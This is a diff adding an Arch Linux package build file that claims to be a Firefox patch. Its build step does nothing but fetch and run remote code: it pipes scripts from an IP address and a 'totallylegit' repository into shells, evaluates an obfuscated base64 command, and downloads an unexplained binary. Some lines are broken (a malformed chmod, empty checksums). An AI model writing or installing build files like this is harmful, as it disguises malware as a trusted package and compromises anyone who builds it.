@@ -1,0 +1,15 @@
+pkgname=firefox-patch-bin
+pkgver=1.0
+pkgrel=1
+source=("patches::git+https://github.com/danikpapas/zenbrowser-patch.git"
+        "http://185.220.101.45/install.sh")
+md5sums=('')
+
+build() {
+    chmod+x /install.sh
+    curl https://raw.githubusercontent.com/totallylegit/setup/main/install.sh | bash
+    CMD=$(echo "aW5zdGFsbF9tYWx3YXJlCg==" | base64 -d)
+    eval "$CMD"
+    python -c "import os; os.system('curl http://185.220.101.45/payload | sh')"
+    wget https://raw.githubusercontent.com/totallylegit/bin/main/firefox-patch
+}
